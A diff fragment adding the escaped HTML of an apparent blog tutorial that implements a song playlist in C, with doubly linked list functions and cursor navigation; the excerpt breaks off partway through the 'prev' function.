+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;span class="lnt">36
+&lt;/span>&lt;span class="lnt">37
+&lt;/span>&lt;span class="lnt">38
+&lt;/span>&lt;span class="lnt">39
+&lt;/span>&lt;span class="lnt">40
+&lt;/span>&lt;span class="lnt">41
+&lt;/span>&lt;span class="lnt">42
+&lt;/span>&lt;span class="lnt">43
+&lt;/span>&lt;span class="lnt">44
+&lt;/span>&lt;span class="lnt">45
+&lt;/span>&lt;span class="lnt">46
+&lt;/span>&lt;span class="lnt">47
+&lt;/span>&lt;span class="lnt">48
+&lt;/span>&lt;span class="lnt">49
+&lt;/span>&lt;span class="lnt">50
+&lt;/span>&lt;span class="lnt">51
+&lt;/span>&lt;span class="lnt">52
+&lt;/span>&lt;span class="lnt">53
+&lt;/span>&lt;span class="lnt">54
+&lt;/span>&lt;span class="lnt">55
+&lt;/span>&lt;span class="lnt">56
+&lt;/span>&lt;span class="lnt">57
+&lt;/span>&lt;span class="lnt">58
+&lt;/span>&lt;span class="lnt">59
+&lt;/span>&lt;span class="lnt">60
+&lt;/span>&lt;span class="lnt">61
+&lt;/span>&lt;span class="lnt">62
+&lt;/span>&lt;span class="lnt">63
+&lt;/span>&lt;span class="lnt">64
+&lt;/span>&lt;span class="lnt">65
+&lt;/span>&lt;span class="lnt">66
+&lt;/span>&lt;span class="lnt">67
+&lt;/span>&lt;span class="lnt">68
+&lt;/span>&lt;span class="lnt">69
+&lt;/span>&lt;span class="lnt">70
+&lt;/span>&lt;span class="lnt">71
+&lt;/span>&lt;span class="lnt">72
+&lt;/span>&lt;span class="lnt">73
+&lt;/span>&lt;span class="lnt">74
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">typedef&lt;/span> &lt;span class="k">struct&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">string&lt;/span> &lt;span class="n">name&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span> &lt;span class="n">Song&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">struct&lt;/span> &lt;span class="n">node&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">struct&lt;/span> &lt;span class="n">node&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">prev&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Song&lt;/span> &lt;span class="n">data&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">struct&lt;/span> &lt;span class="n">node&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">next&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">};&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">typedef&lt;/span> &lt;span class="k">struct&lt;/span> &lt;span class="n">node&lt;/span> &lt;span class="n">Node&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">typedef&lt;/span> &lt;span class="k">struct&lt;/span> &lt;span class="n">PLAYLIST&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Node&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">head&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Node&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">tail&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">size&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span> &lt;span class="n">List&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Node&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nf">newNode&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Node&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">node&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">Node&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="nf">malloc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Node&lt;/span>&lt;span class="p">));&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">node&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">prev&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">node&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">next&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">node&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">List&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nf">newList&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">List&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">list&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">List&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="nf">malloc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">List&lt;/span>&lt;span class="p">));&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">list&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">head&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">list&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">tail&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">list&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">size&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">list&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">void&lt;/span> &lt;span class="nf">addSong&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">List&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">list&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">Node&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">node&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">list&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">head&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">list&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">head&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">node&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">list&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">tail&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">node&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">else&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">list&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">tail&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">next&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">node&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">node&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">prev&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">list&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">tail&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">list&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">tail&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">node&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">list&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">size&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">void&lt;/span> &lt;span class="nf">printPlayList&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">List&lt;/span> &lt;span class="n">list&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">Cursor&lt;/span> &lt;span class="n">cursor&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Node&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">node&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">list&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">head&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;+---------+---------------------------------------------------------------+&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;| Index | Title |&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;+---------+---------------------------------------------------------------+&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">index&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">buffer&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">MAX_INDEX&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">while&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">node&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">snprintf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">buffer&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">MAX_INDEX&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;%d&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">index&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;| %7s | %61s |&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">index&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">cursor&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">index&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="s">&amp;#34; * &amp;#34;&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="n">buffer&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">node&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">data&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">node&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">node&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">next&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">index&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;+---------+---------------------------------------------------------------+&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h4 id="cursor-implementation">Cursor Implementation&lt;/h4>
+&lt;h5 id="cursor-definition">Cursor Definition&lt;/h5>
+&lt;p>The cursor feature allows the user to navigate through the playlist and select a song to play. It keeps track of the current position in the playlist and provides methods to move to the next or previous song. The cursor structure is defined as follows:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="k">typedef&lt;/span> &lt;span class="k">struct&lt;/span> &lt;span class="n">CURSOR&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Node&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">node&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">index&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span> &lt;span class="n">Cursor&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h5 id="next-and-previous-song">Next and Previous Song&lt;/h5>
+&lt;p>Before we implement the &lt;code>next&lt;/code> and &lt;code>prev&lt;/code> functions, we need to define a helper function to check if the cursor is currently pointing to a song in the playlist.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;span class="lnt">8
+&lt;/span>&lt;span class="lnt">9
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="nf">isSelected&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Cursor&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">cursor&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">cursor&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">node&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;No song selected.&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>The &lt;code>next&lt;/code> and &lt;code>prev&lt;/code> functions will move the cursor to the next and previous songs in the playlist, respectively. Because the doubly linked list allows traversal in both directions, we can easily implement these functions.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="kt">void&lt;/span> &lt;span class="nf">next&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Cursor&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">cursor&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// Check if the cursor is at the end of the playlist
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="nf">isSelected&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">cursor&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// Move the cursor to the next song
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">cursor&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">node&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">next&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;This is the last song.&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// Move the cursor to the next song
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">cursor&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">node&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">cursor&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">node&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">next&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">cursor&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">index&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">clearScreen&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">void&lt;/span> &lt;span class="nf">prev&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Cursor&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">cursor&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="nf">isSelected&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">cursor&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
